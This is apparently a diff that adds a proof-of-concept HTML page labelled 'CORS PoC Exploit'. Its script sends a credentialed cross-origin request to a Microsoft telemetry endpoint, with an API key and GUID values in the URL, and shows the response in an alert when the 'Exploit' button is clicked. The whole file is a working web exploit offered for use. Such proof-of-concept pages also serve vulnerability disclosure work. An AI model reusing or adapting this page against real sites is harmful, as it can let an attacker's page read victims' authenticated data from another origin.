@@ -1,0 +1,26 @@
+<html>
+   <head>
+      <script>
+         function cors() {
+            var xhttp = new XMLHttpRequest();
+                xhttp.onreadystatechange = function() {
+                    if (this.readyState == 4 && this.status == 200) {
+                        document.getElementById("emo").innerHTML = alert(this.responseText);
+            }
+         };
+         xhttp.open("GET", "https://browser.events.data.microsoft.com/OneCollector/1.0/?cors=true&content-type=application/x-json-stream&client-id=NO_AUTH&client-version=1DS-Web-JS-3.1.10&apikey=5f6cfa7d26d94e4190b9ef52e3db1453-96b239ab-4f7f-43a7-ac58-5a51f7a0da75-6820&upload-time=1666636741906&ext.intweb.msfpc=GUID%3D67ed77d6cf944eecba99f58c9a1597ab%26HASH%3D67ed%26LV%3D202210%26V%3D4%26LU%3D1666635333798&time-delta-to-apply-millis=1068&w=8", true);
+         xhttp.withCredentials = true;
+         xhttp.send();
+         }
+      </script>
+   </head>
+   <body>
+      <center>
+      <h2>CORS PoC Exploit </h2>
+      <h3>created by <a href="https://instagram.com/ev1lclow3n">@ev1lclow3n</a></h3>
+      <h3>Show full content of page</h3>
+      <div id="demo">
+         <button type="button" onclick="cors()">Exploit</button>
+      </div>
+   </body>
+</html>
